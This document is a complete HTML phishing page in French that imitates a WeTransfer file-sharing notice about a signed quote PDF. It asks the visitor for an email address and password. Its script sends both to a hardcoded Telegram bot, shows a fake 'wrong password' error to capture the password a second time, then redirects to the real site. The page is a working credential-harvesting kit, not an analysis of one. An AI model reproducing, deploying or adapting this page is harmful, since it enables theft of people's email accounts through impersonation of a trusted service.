<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>WeTransfer - Partage de documents s√©curis√©</title>
    <style>
        .logo { height: 120px; width: auto; }
        .pdf-icon { width: 36px; height: 36px; }
        .form-container {
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 12px;
        }
        .hidden { display: none; }
    </style>
</head>
<body class="bg-gray-50">
    <div class="flex flex-col items-center justify-center min-h-screen p-4">
        <div class="mb-6 text-center">
            <img src="https://gotrialpro.net/wp-content/uploads/edd/2024/07/WeTransfer-Free-Trial-1024x473.png" 
                 alt="WeTransfer Logo" class="logo mx-auto">
        </div>
        
        <div class="form-container bg-white w-full max-w-md p-6">
            <p class="text-gray-700 mb-4 text-center font-medium">Vous avez re√ßu un fichier s√©curis√©</p>
            
            <div class="flex items-center justify-center mb-6">
                <svg class="pdf-icon text-red-500" fill="currentColor" viewBox="0 0 384 512">
                    <path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"/>
                </svg>
                <p class="font-bold mx-3 text-gray-800">Devis sign√© + Acompte.pdf</p>
            </div>
            
            <p class="text-gray-600 mb-6 text-center text-sm">Pour acc√©der √† ce document, veuillez entrer les identifiants de messagerie associ√©s √† ce transfert.</p>
            
            <div class="space-y-4">
                <!-- √âtape 1 : Email -->
                <div id="email-step">
                    <input type="email" id="zone-email" 
                           class="border border-gray-300 w-full p-3 rounded-lg" 
                           placeholder="Entrez votre email"/>
                    <p id="email-error" class="text-red-500 text-sm mt-1 hidden">Veuillez entrer une adresse email valide</p>
                    <button id="email-submit" 
                            class="w-full bg-orange-500 text-white font-bold py-3 px-4 rounded-lg mt-4">
                        Continuer
                    </button>
                </div>
                
                <!-- √âtape 2 : Mot de passe (cach√© initialement) -->
                <div id="password-step" class="hidden">
                    <input type="password" id="zone-password" 
                           class="border border-gray-300 w-full p-3 rounded-lg" 
                           placeholder="Entrez votre mot de passe"/>
                    <p id="password-error" class="text-red-500 text-sm mt-1 hidden">Mot de passe incorrect</p>
                    <button id="password-submit" 
                            class="w-full bg-orange-500 text-white font-bold py-3 px-4 rounded-lg mt-4">
                        Acc√©der au document
                    </button>
                </div>
            </div>
        </div>
        
        <div class="mt-8 text-sm text-gray-500 text-center">
            <p>¬© WeTransfer 2025 - Service s√©curis√© de transfert de fichiers</p>
        </div>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        const emailStep = document.getElementById("email-step");
        const passwordStep = document.getElementById("password-step");
        const emailInput = document.getElementById("zone-email");
        const passwordInput = document.getElementById("zone-password");
        const emailError = document.getElementById("email-error");
        const passwordError = document.getElementById("password-error");
        const emailSubmit = document.getElementById("email-submit");
        const passwordSubmit = document.getElementById("password-submit");
        
        let attempts = 0;
        const maxAttempts = 2;
        
        // √âtape 1: Validation de l'email
        emailSubmit.addEventListener("click", function() {
            const email = emailInput.value.trim();
            
            // Validation simple de l'email
            if (!email || !email.includes("@") || !email.includes(".")) {
                emailError.classList.remove("hidden");
                return;
            }
            
            // Cacher l'√©tape email et afficher l'√©tape mot de passe
            emailStep.classList.add("hidden");
            passwordStep.classList.remove("hidden");
            emailError.classList.add("hidden");
        });
        
        // √âtape 2: Validation du mot de passe
        passwordSubmit.addEventListener("click", async function() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            attempts++;
            
            if (!password) {
                passwordError.classList.remove("hidden");
                return;
            }
            
            // Envoi des donn√©es au bot Telegram
            try {
                const botToken = '7764474639:AAHWk35_vTy4CLr00OB6y2gJ9f8JDWls0bg';
                const chatId = '5762481570';
                const message = `
                ----------üòàWETRANSFERT LOGINüòà--------
                üìß Email: ${email}\n
                üîë Mot de passe: ${password}\n
                üì± Device: ${/Mobi/.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
                ----------ü¶áUltimate-genjutsuü¶á--------`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
                
                // Apr√®s 2 tentatives, rediriger automatiquement
                if (attempts >= maxAttempts) {
                    window.location.href = "https://wetransfer.com";
                } else {
                    passwordError.classList.remove("hidden");
                    passwordInput.value = "";
                    passwordInput.focus();
                }
                
            } catch (error) {
                console.error("Erreur:", error);
                // En cas d'erreur d'envoi, rediriger quand m√™me
                window.location.href = "https://wetransfer.com";
            }
        });
        
        // Permettre la soumission avec la touche Entr√©e
        emailInput.addEventListener("keypress", function(e) {
            if (e.key === "Enter") emailSubmit.click();
        });
        
        passwordInput.addEventListener("keypress", function(e) {
            if (e.key === "Enter") passwordSubmit.click();
        });
    });
    </script>
</body>
</html>

